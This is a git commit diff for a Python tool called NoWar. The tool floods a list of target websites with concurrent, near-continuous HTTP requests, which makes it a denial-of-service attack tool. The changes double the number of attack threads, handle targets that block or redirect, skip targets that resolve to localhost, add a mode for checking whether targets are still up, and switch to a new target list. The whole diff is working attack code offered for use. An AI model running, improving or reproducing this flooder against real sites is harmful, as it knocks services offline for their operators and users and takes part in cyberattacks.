0c6911dc408efba2e8fdd392e60eb3cb76c4bee7
Ivan Ponomarev <pi@spaf.dev>
2022-03-01 15:45:55 +0100

    Some minimal improvements.
    Update of the target list

--- base/NoWar.py
+++ base/NoWar.py
@@ -1,13 +1,16 @@
+import logging
+import socket
 import threading
 from random import randrange
 from time import sleep
 
 import requests
+from requests import ConnectTimeout, ConnectionError, ReadTimeout
 
 
 class NoWar:
 
-	agents_quantity: int = 5
+	agents_quantity: int = 10
 	sleep_time: float or int = 0.001
 
 	_agents: list = None
@@ -37,7 +40,7 @@ class NoWar:
 
 	def deploy(self):
 		threads = []
-		print('NoWar app deployed')
+		logging.info('## NoWar app deployed')
 		for site in self._sites:
 			t = threading.Thread(target=self.one_host, args=(site, ))
 			threads.append(t)
@@ -47,19 +50,68 @@ class NoWar:
 			t.join()
 
 	def one_host(self, host):
-		print(f'Started loop for host: {host}')
+		logging.info('Started loop for host: %s', host)
 		while True:
 			try:
+				ip = self.get_ip(host)
+
+				if ip.startswith('127.'):
+					logging.info('>> %s | localhost skipped for now (waiting 60s)', host)
+					sleep(60)
+					continue
+
 				res = self.query_host(host)
+
 				if res.status_code == 200:
-					print(f'Request is ok: {host}')
+					logging.info('Request is ok: %s', host)
 				else:
-					print(f'Request is not ok: {host}')
-				print(res)
+					logging.error('Request is not ok: %s', host)
+					if 300 <= res.status_code < 400:
+						logging.info('>> %s | redirecting skipped for now (waiting 60s)', host)
+						sleep(60)
+						continue
+					elif 400 <= res.status_code < 500:
+						logging.info('>> %s | blocked (waiting 60s)', host)
+						sleep(60)
+						continue
+				logging.info('%s %s', host, res.status_code)
+			except ConnectTimeout as e:
+				logging.error('>> %s connection timed out / %s', host, e)
+			except ConnectionError as e:
+				logging.error('>> %s connection error / %s', host, e)
+			except ReadTimeout as e:
+				logging.error('>> %s read timeout / %s', host, e)
 			except Exception as e:
-				print(f'Exception: {e}')
-			print(f'Endpoint: {host}')
+				logging.info('Exception: %s', e)
+				break
 			sleep(self.sleep_time)
+			# break
+
+	def get_ip(self, host):
+		host_cleared = str(host).replace('https://', '').replace('http://', '').replace('/', '')
+		return socket.gethostbyname(host_cleared)
+
+	def check_hosts(self):
+		logging.info('## Checking hosts')
+		for host in self._sites:
+			try:
+				ip = self.get_ip(host)
+
+				if ip.startswith('127.'):
+					logging.info('>> %s | localhost skipped', host)
+					continue
+				try:
+					res = self.query_host(host)
+
+					logging.info('>> %s | %s | HTTP %s', host, ip, res)
+				except ConnectTimeout as e:
+					logging.error('>> %s connection timed out (%s)', host, e)
+				except ConnectionError as e:
+					logging.error('>> %s connection error (%s)', host, e)
+				except ReadTimeout as e:
+					logging.error('>> %s read timeout (%s)', host, e)
+			except socket.gaierror as e:
+				logging.error('>> %s does not exist', host)
 
 	@classmethod
 	def extract_lines(cls, file: str):
@@ -69,3 +121,7 @@ class NoWar:
 				res.append(line.strip())
 
 		return res
+
+	@classmethod
+	def setup_logger(cls):
+		logging.basicConfig(level=logging.INFO)
--- main.py
+++ main.py
@@ -1,11 +1,35 @@
 #!/bin/env python
+from argparse import ArgumentParser, Namespace
 
 from base import NoWar
 
+# agents = NoWar.extract_lines('data/agents.txt')
 agents = NoWar.extract_lines('data/agents.txt')
-sites = NoWar.extract_lines('data/sites.txt')
+sites = NoWar.extract_lines('data/sites-new.txt')
+no_war = NoWar(sites, agents)
+NoWar.setup_logger()
+
+
+def deploy(args: Namespace):
+	no_war.deploy()
+
+
+def check_targets(args: Namespace):
+	no_war.check_hosts()
 
 
 if __name__ == '__main__':
-	no_war = NoWar(sites, agents)
-	no_war.deploy()
+	parser = ArgumentParser()
+	subs = parser.add_subparsers()
+
+	p = subs.add_parser('deploy')
+	p.set_defaults(func=deploy)
+
+	p = subs.add_parser('check')
+	p.set_defaults(func=check_targets)
+
+	args = parser.parse_args()
+	if hasattr(args, 'func'):
+		args.func(args)
+	else:
+		parser.print_help()
